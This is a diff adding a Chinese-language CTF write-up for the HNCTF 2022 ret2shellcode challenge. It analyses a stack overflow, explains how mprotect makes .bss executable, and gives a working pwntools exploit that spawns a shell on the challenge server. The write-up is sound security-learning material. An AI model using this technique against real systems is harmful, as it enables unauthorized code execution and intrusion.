@@ -409,3 +409,75 @@ int __fastcall sub_1051(__int64 a1)
   return result;
 }
 ```
+关于堆函数中的参数可以参考[文章](https://blog.csdn.net/weixin_43847969/article/details/104897249)
+
+
+
+# [HNCTF 2022 Week1]ret2shellcode
+>知识点：ret2shellcode
+
+checksec:
+```bash
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+没有找到后门函数，考虑shellcode
+主函数：
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[256]; // [rsp+0h] [rbp-100h] BYREF
+
+  setbuf(stdin, 0LL);
+  setbuf(stderr, 0LL);
+  setbuf(stdout, 0LL);
+  mprotect((void *)((unsigned __int64)&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);
+  memset(s, 0, sizeof(s));
+  read(0, s, 0x110uLL);
+  strcpy(buff, s);
+  return 0;
+}
+```
+很明显read有栈溢出，又复制到buff中
+![](image-4.png)
+buff又在.bass中
+```bash
+在采用段式内存管理的架构中（比如 intel 的 80x86 系统），bss 段（Block Started by Symbol segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，一般在初始化时 bss 段部分将会清零（bss 段属于静态内存分配，即程序一开始就将其清零了）。比如，在 C 语言程序编译完成之后，已初始化的全局变量保存在.data 段中，未初始化的全局变量保存在.bss 段中
+简单来说，定义而没有赋初值的全局变量和静态变量 , 放在这个区域
+```
+但之前checksec发现有NX保护栈不可执行，又看到主函数有mprotect函数可以修改权限，也就是说在经过函数mprotect后，部分地址可以执行
+![alt text](image-5.png)
+用gdb调试看到0x404000后的地址有执行权限了，所以使用shellcode是可以用的
+exp:
+```python
+from pwn import*
+context(log_level = "debug", arch = 'amd64')
+io=remote('node5.anna.nssctf.cn',27315)
+buff_adr=0x04040A0
+shellcode=asm(shellcraft.sh())
+padding=0x100+0x8
+payload=shellcode.ljust(padding,b'a')+p64(buff_adr)
+io.sendline(payload)
+io.interactive()
+
+```
+context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。
+
+一般来说我们设置context只需要简单的一句话:
+
+context(os='linux', arch='amd64', log_level='debug')
+
+或者 context(os='linux', arch='amd64')
+```bash
+1. os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux
+2. arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’
+3. log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。
+```
+
+有些shellcode题目会限制shellcode的输入，这时候就要自己去生成具体看[这个](https://blog.csdn.net/SmalOSnail/article/details/105236336)
